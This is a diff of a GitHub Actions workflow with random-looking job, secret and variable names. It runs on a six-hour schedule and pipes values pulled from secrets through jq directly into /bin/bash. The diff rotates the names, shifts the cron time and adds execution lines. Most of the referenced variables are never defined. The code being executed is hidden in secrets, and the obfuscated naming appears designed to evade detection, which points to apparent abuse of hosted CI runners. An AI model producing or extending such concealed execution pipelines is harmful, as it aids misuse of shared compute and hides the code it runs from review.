@@ -2,7 +2,7 @@ name: tengyuxi3412
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 0/6 * * *'
+    - cron: '43 4/6 * * *'
 
 jobs:
   build:
@@ -12,12 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: tengyuxi3412
         env:
-          nqukv88: ${{ secrets.nqukv88 }}
+          o3518: ${{ secrets.o3518 }}
         run: |
-          echo $nqukv88 | jq -r .wp3820 | /bin/bash
-          echo $wz6 | jq -r .dlv51240 | /bin/bash
-          echo $wlfx95982 | jq -r .moila97095 | /bin/bash
-          echo $jtcw7 | jq -r .ft2531 | /bin/bash
-          echo $icz44 | jq -r .awa16 | /bin/bash
-          echo $h5866 | jq -r .t39017 | /bin/bash
+          echo $o3518 | jq -r .omo3968 | /bin/bash
+          echo $b22565 | jq -r .cu1031 | /bin/bash
+          echo $tncx831 | jq -r .wvcz90721 | /bin/bash
+          echo $h176 | jq -r .h2716 | /bin/bash
+          echo $mot41 | jq -r .mu110 | /bin/bash
+          echo $o463 | jq -r .iyznl8 | /bin/bash
+          echo $t00682 | jq -r .nqnr2596 | /bin/bash
+          echo $pffmn9224 | jq -r .ht99834 | /bin/bash
 
